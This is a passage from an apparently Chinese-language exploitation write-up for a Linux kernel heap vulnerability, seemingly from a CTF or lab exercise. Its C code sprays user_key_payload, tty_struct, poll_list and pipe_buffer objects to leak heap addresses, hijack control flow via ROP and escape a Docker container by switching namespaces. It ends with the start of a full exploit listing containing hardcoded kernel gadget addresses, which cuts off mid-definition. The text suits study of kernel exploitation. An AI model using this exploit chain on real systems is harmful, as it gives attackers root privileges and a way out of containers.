<p>其中第一个字段指向与自身绑定的tty_struct，因此我们可以利用这一点来进行溢出</p>
<p>此时我们释放除了 <code>victim user_key_payload</code>以外的所有 <code>user_key_payload</code>,然后堆喷 <code>struct tty_struct</code> 这样就会变成以下情况</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/314e251f95cad1c825e73813393e6709c93d51a2.jpg" srcset="/img/loading.gif" lazyload></p>
<p>这样我们再次读取 <code>victim user_key_payload</code>就会造成堆地址泄露，且这个堆地址是某个 <code>tty_struct</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; USER_KEY_PAYLOAD_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == victim_key_idx) <span class="hljs-keyword">continue</span>;<br>        key_revoke(key_id[i]);<br>        key_unlink(key_id[i]);<br>    &#125;<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TTY_SPRAY_NR; i++)&#123;<br>        ptmx_id[i] = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);<br>        <span class="hljs-keyword">if</span>(ptmx_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Alloc the ptmx failed...&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(key_read(key_id[victim_key_idx], data, <span class="hljs-number">0x1000</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;read victim key failed&quot;</span>);<br>    &#125;    <br>    <span class="hljs-keyword">if</span>(leak_heap_addr(data) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;leak heap base failed&quot;</span>);<br>    &#125;<br><br></code></pre></td></tr></table></figure>

<h3 id="4-劫持执行流"><a href="#4-劫持执行流" class="headerlink" title="4.劫持执行流"></a>4.劫持执行流</h3><p>我们本次选择 <code>pipe_buffer</code>来作为我们的目标，我们现在手上还存在着的一个 <code>victim user_key_payload</code>.这里我们释放所有的 <code>seq_operations</code>，其中也释放掉了 <code>victim user_key_payload</code>，这样以来就又制造出来一个UAF漏洞，然后再堆喷 32字节大小的 <code>poll_list</code>，就会造成以下结果</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/9f2f070828381f300af8499def014c086e06f026.jpg" srcset="/img/loading.gif" lazyload></p>
<p>这里注意仍会有一个 <code>poll_list</code>也指向我们的 <code>victim user_key_payload</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">info_log(<span class="hljs-string">&quot;Step IX: Hijack the control stream...&quot;</span>);<br>   <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Free the part2 seq_operations...&quot;</span>);<br>   <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = SEQ_SPRAY_NR; i &lt; SEQ_SPRAY_NR + <span class="hljs-number">128</span>; i++)&#123;<br>       close(seq_id[i]);<br>   &#125;<br>   <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Allocate 32 size poll_list...&quot;</span>);<br>   <span class="hljs-comment">/* these up will free twice the victim user_key_payload */</span><br>   bind_core(<span class="hljs-number">1</span>);<br>   <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">192</span>; i++)&#123;<br>       create_poll_thread(i, <span class="hljs-number">32</span>, <span class="hljs-number">4000</span>, <span class="hljs-number">1</span>);<br>   &#125;<br>   bind_core(<span class="hljs-number">0</span>);<br>   <span class="hljs-keyword">while</span>(poll_threads != <span class="hljs-number">192</span>)&#123;&#125;;<br>   sleep(<span class="hljs-number">1</span>);<br><br></code></pre></td></tr></table></figure>

<p>然后我们在这里释放掉我们的 <code>victim user_key_payload</code>，这样就会造成一个 <code>poll_list</code>存在UAF，然后我们此时的目的是修改这个 <code>poll_list</code>的next指针，使得时钟到的时候能够自动释放该指针指向的堆块，这里我们将其中的next指针修改为我们之前泄露的某个 <code>tty_struct</code>的地址-0x18，这里减去0x18是为了不让我们之后分配到的 <code>user_key_payload</code>头部的0x18字节影响到，如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Free victim user_key_payload to construct poll_list uaf...&quot;</span>);<br>    key_revoke(key_id[victim_key_idx]);<br>    key_unlink(key_id[victim_key_idx]);<br>    ((<span class="hljs-type">size_t</span> *)data)[<span class="hljs-number">0</span>] = page_offset_base - <span class="hljs-number">0x18</span>;<br>    sleep(<span class="hljs-number">1</span>); <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Allocate setxattr and user_key_payload...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; USER_KEY_PAYLOAD_SPRAY_NR; i++)&#123;<br>        setxattr(<span class="hljs-string">&quot;/home/user/.bashrc&quot;</span>, <span class="hljs-string">&quot;user.x&quot;</span>, data, <span class="hljs-number">32</span>, XATTR_CREATE);<br>        <span class="hljs-built_in">sprintf</span>(description, <span class="hljs-string">&quot;payload_%d&quot;</span>, i);<br>        <span class="hljs-built_in">memset</span>(buff, i, <span class="hljs-keyword">sizeof</span>(buff));<br>        key_id[i] = key_alloc(description, buff, <span class="hljs-number">0x8</span>);<br>        <span class="hljs-keyword">if</span>(key_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[X]key index %d id is %d\n&quot;</span>, i,key_id[i]);<br>            error_log(<span class="hljs-string">&quot;key alloc failed!&quot;</span>);<br>        &#125;<br>    &#125; <br><br></code></pre></td></tr></table></figure>

<p><img src="http://imgsrc.baidu.com/forum/pic/item/908fa0ec08fa513ddc69a8ea7b6d55fbb3fbd9c0.jpg" srcset="/img/loading.gif" lazyload></p>
<p>可以看到其中浅灰色的部分就是我们想要达到的效果，这里想要达成修改同之前清洗一样，使用 <code>setxattr</code>的手段对每个分配到的kmalloc-32进行清洗，此时就是变成写 <code>target-0x18</code>，为了避免之后这里的值被修改，因此紧接着再次分配 32字节大小的 <code>user_key_payload</code>进行占位，情况如下：</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/8d5494eef01f3a2973fb12fadf25bc315c607cd7.jpg" srcset="/img/loading.gif" lazyload></p>
<p>截至目前，红色快部分的 <code>poll_list</code>的头八字节已经被成功固定为 <code>target-0x18</code></p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/728da9773912b31b61420a1dc018367adab4e1dd.jpg" srcset="/img/loading.gif" lazyload></p>
<p>此时我们立刻释放所有的 <code>tty_struct</code>，然后堆喷0x400大小的 <code>pipe_buffer</code>，构造如下效果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Free all the tty and alloc pipe_buffer...&quot;</span>);<br>   <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TTY_SPRAY_NR; i++)&#123;<br>       close(ptmx_id[i]);<br>   &#125;<br>   sleep(<span class="hljs-number">1</span>);<br>   <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x400</span>; i++)&#123;<br>       alloc_pipe_buffer(i);<br>   &#125;<br><br></code></pre></td></tr></table></figure>

<p><img src="http://imgsrc.baidu.com/forum/pic/item/aec379310a55b31928fa454105a98226cffc1787.jpg" srcset="/img/loading.gif" lazyload></p>
<p>然后我们等待 <code>poll_list</code>计时器到达然后进行释放，这里就会释放掉我们 <code>target-0x18</code>开头的虚假 1k object，然后我们此时堆喷1k大小的 user_key_payload就可以写入pipe_buffer了，此时我们可以修改他的ops函数数组来进行ROP</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/a2cc7cd98d1001e97a47d33bfe0e7bec54e7978f.jpg" srcset="/img/loading.gif" lazyload></p>
<p>这样最后找到合适的gadget即可进行提权</p>
<h3 id="5-容器逃逸"><a href="#5-容器逃逸" class="headerlink" title="5.容器逃逸"></a>5.容器逃逸</h3><p>这里虽然说我们已经可以进行提权，但是还完全不够，因为提升的权限仅仅是我们docker容器的root权限，并不是我们真正的root，因此这里需要我们进行下一步操作</p>
<p>我们在容器中可以通过内核函数 <code>find_task_by_vpid</code>来寻找task_struct，这里我们可以首先在容器内部完成提权，然后使用函数 <code>find_task_by_vpid(1)</code>来获得**容器中的init&#x2F;swap进程的 <code>task_struct</code>**，</p>
<p>容器中的逃逸并不像vm那样存在<code>hypervisor</code>，这里我们只需要进行命名空间的切换即可，而常用的切换命名空间的系统调用例如 <code>unshare、setns</code>都被seccomp禁用，因此我们利用一个替换者那就是 <code>switch_task_namespaces()</code></p>
<p>我们将当前命名空间下的init进程的命名空间切换为**内核当中的 <code>init_proxy</code><strong>，</strong>这里是由内核当中提取的，并不是docker当中的 <code>init_proxy</code>**，总结下来就是调用下面的函数</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">switch<span class="hljs-constructor">_task_namespaces(<span class="hljs-params">task</span>, <span class="hljs-params">init_proxy</span>)</span>;<br></code></pre></td></tr></table></figure>

<p>但是上面的部分还不足成功逃逸，</p>
<p>由于setns被过滤，这导致我们无法在返回用户空间后进入其他的命名空间，因此我们需要模拟 setns()函数中的 <code>commit_nsset()</code>功能，我们利用函数 <code>copy_fs_struct</code> 获取内核当中的 <code>init_fs</code>所对应的 <code>fs_struct</code>结构体，然后赋值给我们当前进程的 <code>task_struct-&gt;fs</code>，这样就实现了资源的转移，也就是说调用下面的函数</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">find_task_by_vpid<span class="hljs-function"><span class="hljs-params">(getpid())</span>-&gt;</span>fs = copy_fs_struct(init_fs);<br></code></pre></td></tr></table></figure>

<p><img src="http://imgsrc.baidu.com/forum/pic/item/b999a9014c086e06f814fe7f44087bf40ad1cb43.jpg" srcset="/img/loading.gif" lazyload></p>
<p>最终exp如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span>             </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span>             </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span>              </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span>            </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span>          </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;syscall.h&gt;</span>       </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span>      </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/keyctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/xattr.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USER_KEY_PAYLOAD_SPRAY_NR 199</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEQ_SPRAY_NR 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TTY_SPRAY_NR 72</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEY_SPEC_PROCESS_KEYRING	-2	<span class="hljs-comment">/* - key ID for process-specific keyring */</span></span><br><br><span class="hljs-comment">/* keyctl commands */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_UPDATE			2	<span class="hljs-comment">/* update a key */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_REVOKE			3	<span class="hljs-comment">/* revoke a key */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_UNLINK			9	<span class="hljs-comment">/* unlink a key from a keyring */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KEYCTL_READ			11	<span class="hljs-comment">/* read a key or keyring&#x27;s contents */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KERNEL_MASK 0xffffffff00000000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HEAP_MASK 0xffff000000000000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VMMAP_MASK 0xffffe00000000000</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N_STACK_PPS 240</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POLL_LIST_SIZE 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POLLFD_SIZE 8;</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 4096</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SINGLE_START 0xffffffff812d0e30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROC_SINGLE_SHOW 0xffffffff81323390</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810e8e70</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810e8bf0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RSI_JMP_RSI_39 0xffffffff815986b6</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RSP_RET 0xffffffff81000755</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ADD_RSP_50_RET 0xffffffff8115c0a1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff81001cb9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RSI_RET 0xffffffff810033a5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RDI_RAX_RET 0xffffffff81029a73</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_AND_RETURN_TO_USERMDOE 0xffffffff81c00f06</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FIND_TASK_BY_VPID 0xffffffff810e20f0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_NSPROXY 0xffffffff8245a760</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_FS 0xffffffff82589780</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWITCH_TASK_NAMESPACES 0xffffffff810e7300</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COPY_FS_STRUCT 0xffffffff812e45f0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RCX_RAX 0xffffffff814e97e4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ADD_RAX_R8 0xffffffff81565011</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_R8 0xffffffff811e23b1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RAX_RCX 0xffffffff81039dda</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RCX_RET 